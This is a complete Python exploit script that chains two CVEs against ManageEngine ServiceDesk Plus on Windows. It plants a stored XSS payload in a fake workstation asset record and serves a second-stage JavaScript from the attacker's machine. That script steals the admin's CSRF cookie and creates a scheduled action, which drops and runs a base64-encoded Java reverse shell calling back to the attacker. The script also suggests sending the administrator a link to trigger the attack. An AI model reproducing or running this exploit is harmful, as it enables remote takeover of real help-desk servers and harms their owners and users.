import requests, sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import quote
import random

# Author: Chris Lyne (@lynerc)
# Exploits CVE-2021-20080 and CVE-2021-20081 in chain

if len(sys.argv) < 4:
    print("Usage: script.py <http(s)://target:port> <attacker ip> <attacker port>") 
    sys.exit(0)

target = sys.argv[1]
shell_ip = sys.argv[2]
shell_port = sys.argv[3]

stage2_url = "http://" + shell_ip + "/stage2"   # XSS will call back here to download more JS

# targeting ManageEngine Servicedesk Plus on Windows

# This XSS is staged due to length restrictions. It loads more JS from the attacker's machine
# spaces not allowed
xss = """');}{function/**/loaded(){eval(this.responseText);}var/**/req=new/**/XMLHttpRequest();req.addEventListener("load",loaded);req.open("GET","${stage2}");req.send(null);//"""
xss = xss.replace("${stage2}", stage2_url)

# This XML contains info for a new workstation asset
xml = """<?xml version="1.0" encoding="UTF-8" ?><DocRoot>
<ComputerName><command>hostname</command><output><![CDATA[
]]></output></ComputerName>
<OS_Category><command>uname -s</command><output><![CDATA[
Darwin
]]></output></OS_Category>
<Hardware_Info>
<OS_Category><command>sw_vers</command><output><![CDATA[
ProductName:	macOS
ProductVersion:	11.1
BuildVersion:	20C69
]]></output></OS_Category>
<Computer_Information><command>hostname -s</command><output><![CDATA[
${workstation}
]]></output></Computer_Information>
<CPU_Information><command>system_profiler SPHardwareDataType</command><output><![CDATA[
Hardware:

    Hardware Overview:

      Model Name: MacBook Pro
      Model Identifier: MacBookPro14,3
      Processor Name: Quad-Core Intel Core i7
      Processor Speed: 2.9 GHz
      Number of Processors: 1
      Total Number of Cores: 4
      L2 Cache (per Core): 256 KB
      L3 Cache: 8 MB
      Hyper-Threading Technology: Enabled
      Memory: 16 GB
      System Firmware Version: 429.61.7.0.0
      SMC Version (system): 2.46f4
      Serial Number (system): A03XJ3PMHTK9

]]></output></CPU_Information>
<NIC_Info><command>/sbin/ifconfig</command><output><![CDATA[
en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	options=400<CHANNEL_IO>
	ether 7c:83:91:d4:a7:c4 
	inet6 fe80::102b:587a:9312:a8dc%en0 prefixlen 64 secured scopeid 0x5 
	inet ${xss} netmask 0xffffff00 broadcast 192.168.0.255
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active
]]></output></NIC_Info>
<PhysicaldrivesInfo><command>/usr/sbin/system_profiler SPParallelATADataType</command><output><![CDATA[
]]></output></PhysicaldrivesInfo>
<HarddrivesInfo><command>/usr/sbin/system_profiler SPSerialATADataType</command><output><![CDATA[
]]></output></HarddrivesInfo>
</Hardware_Info>
<Software_Info>
<Installed_Softwares><command>system_profiler SPApplicationsDataType</command><output><![CDATA[
]]></output></Installed_Softwares>
</Software_Info>
</DocRoot>"""

# fill in xml placeholders
workstation = 'tenable_zero_day'
xml = xml.replace('${workstation}', workstation)
xml = xml.replace('${xss}', xss)

headers = {'Content-Type': 'application/xml'}
print("Sending malicious XML document...")
res = requests.post(target + '/discoveryServlet/WsDiscoveryServlet?computerName=tenable_zero_day_was_here', data=xml, headers=headers) 

print(res.text)

print("\nThe administrator must view your asset now. Either wait patiently or send them this link to entice them to view the asset:\n'" + target + "/SearchN.do?searchText=tenable_zero_day&subModSelText=&selectName=assets'");

# ok now wait for a call back from the xss
# this will happen when the admin visits the asset page

data = """var/**/client=new/**/XMLHttpRequest();client.open("GET","/",true);client.send();var/**/now;var/**/start_time;var/**/start_milli;client.onreadystatechange=function(){if(this.readyState==this.HEADERS_RECEIVED){var/**/date=client.getResponseHeader("Date");now=new/**/Date(date);start_time=now;start_milli=start_time.setMinutes(now.getMinutes()+1);t="";c=document.cookie.split(";");for(i=0;i<c.length;i++){var/**/e=c[i].trim();if(e.startsWith("sdpcsrfcookie")){t=e.split("=")[1];}}var/**/xhr=new/**/XMLHttpRequest();xhr.open("POST","/api/v3/custom_schedules",true);xhr.withCredentials=true;xhr.setRequestHeader("X-ZCSRF-TOKEN",t);xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xhr.send("INPUT_DATA=%7B%22custom_schedules%22%3A%7B%22is_enabled%22%3Atrue%2C%22description%22%3A%22test123%22%2C%22executor_type%22%3A%22script%22%2C%22is_periodic%22%3Atrue%2C%22interval_type%22%3A%22hours%22%2C%22interval_value%22%3A%221%22%2C%22executor%22%3A%22${payload}%22%2C%22name%22%3A%22${name}%22%2C%22start_time%22%3A%7B%22value%22%3A%22"+start_milli+"%22%7D%7D%7D&sdpcsrfparam="+t);}}"""

# random schedule name so we can create new ones
data = data.replace("${name}", 'test'+str(random.random()*10000)[:4])

# this payload will pop you a reverse shell
payload = 'cmd /c '
payload += '\\"cd c:\\\\ && '
# write a base64-encoded Java-based reverse shell to c:\\b64file
# shell courtesy of https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
payload += 'echo,yv66vgAAADQAeQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsABgEAD1JldmVyc2VUY3BTaGVsbAEACnByaW50VXNhZ2UKAA0ADgcADwwAEAARAQAQamF2YS9sYW5nL1N5c3RlbQEABGV4aXQBAAQoSSlWCgATABQHABUMABYAFwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkIABkBAAdjbWQuZXhlBwAbAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAdAQAQamF2YS9sYW5nL1N0cmluZwoAGgAfDAAFACABABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWCgAaACIMACMAJAEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwoAGgAmDAAnACgBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwcAKgEAD2phdmEvbmV0L1NvY2tldAoAKQAsDAAFAC0BABYoTGphdmEvbGFuZy9TdHJpbmc7SSlWCgAvADAHADEMADIAMwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwoALwA1DAA2ADMBAA5nZXRFcnJvclN0cmVhbQoAKQAwCgAvADkMADoAOwEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwoAKQA5CgApAD4MAD8AQAEACGlzQ2xvc2VkAQADKClaCgBCAEMHAEQMAEUARgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAlhdmFpbGFibGUBAAMoKUkKAEIASAwASQBGAQAEcmVhZAoASwBMBwBNDABOABEBABRqYXZhL2lvL091dHB1dFN0cmVhbQEABXdyaXRlCgBLAFAMAFEABgEABWZsdXNoBQAAAAAAAAAyCgBVAFYHAFcMAFgAWQEAEGphdmEvbGFuZy9UaHJlYWQBAAVzbGVlcAEABChKKVYKAC8AWwwAXABGAQAJZXhpdFZhbHVlBwBeAQATamF2YS9sYW5nL0V4Y2VwdGlvbgoALwBgDABhAAYBAAdkZXN0cm95CgApAGMMAGQABgEABWNsb3NlCQANAGYMAGcAaAEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwgAagEAJ1VzYWdlOiBSZXZlcnNlVGNwU2hlbGwuamF2YSA8aXA+IDxwb3J0PgoAbABtBwBuDABvAHABABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARtYWluAQANU3RhY2tNYXBUYWJsZQcAdgEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAUUmV2ZXJzZVRjcFNoZWxsLmphdmEAIQAIAAIAAAAAAAMAAQAFAAYAAQBxAAAAHQABAAEAAAAFKrcAAbEAAAABAHIAAAAGAAEAAAANAAkAcwAgAAEAcQAAAacABgAMAAAA1iq+BaIACrgABwO4AAwqAzJMKgQyuAASPRIYTrsAGlkEvQAcWQMtU7cAHgS2ACG2ACU6BLsAKVkrHLcAKzoFGQS2AC46BhkEtgA0OgcZBbYANzoIGQS2ADg6CRkFtgA8OgoZBbYAPZoAYBkGtgBBngAQGQoZBrYAR7YASqf/7hkHtgBBngAQGQoZB7YAR7YASqf/7hkItgBBngAQGQkZCLYAR7YASqf/7hkKtgBPGQm2AE8UAFK4AFQZBLYAWlenAAg6C6f/nhkEtgBfGQW2AGKnAAU6BLEAAgC4AL4AwQBdABsA0ADTAF0AAgByAAAAYgAYAAAAEAAGABIACQATAA0AFQARABYAGAAXABsAGQAzABoAPgAbAFMAHABhAB0AaQAeAH4AHwCTACAAqAAhAK0AIgCyACMAuAAlAL4AJgDBACcAxgApAMsAKgDQACsA1QAsAHQAAABHAAoN/wBTAAsHAHUHABwBBwAcBwAvBwApBwBCBwBCBwBCBwBLBwBLAAAHFBQUWAcAXQT/AAwABAcAdQcAHAEHABwAAQcAXQEACQALAAYAAQBxAAAAJQACAAAAAAAJsgBlEmm2AGuxAAAAAQByAAAACgACAAAALgAIAC8AAQB3AAAAAgB4> b64file && '
# base64 decode the file into a Java class file
payload += 'certutil -f -decode b64file ReverseTcpShell.class && '
# and run it using the jvm packaged with the product
payload += 'C:\\\\PROGRA~1\\\\ManageEngine\\\\ServiceDesk\\\\jre\\\\bin\\\\java.exe ReverseTcpShell ${shell_ip} ${shell_port}\\"'
payload = payload.replace("${shell_ip}", shell_ip).replace("${shell_port}", shell_port)

# url encode payload
payload = quote(payload, safe='')

data = data.replace("${payload}", payload)

PORT_NUMBER = 80
class MyHTTPD(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        print("\nReceived a callback from the XSS. Sending stage 2 to create malicious custom scheduled action.")
        print("You should probably start your netcat listener now... ")
        self.wfile.write(data.encode('UTF-8'))

httpd = HTTPServer(('0.0.0.0', PORT_NUMBER), MyHTTPD)

print('Starting HTTP listener...')
httpd.handle_request()  # just one is fine
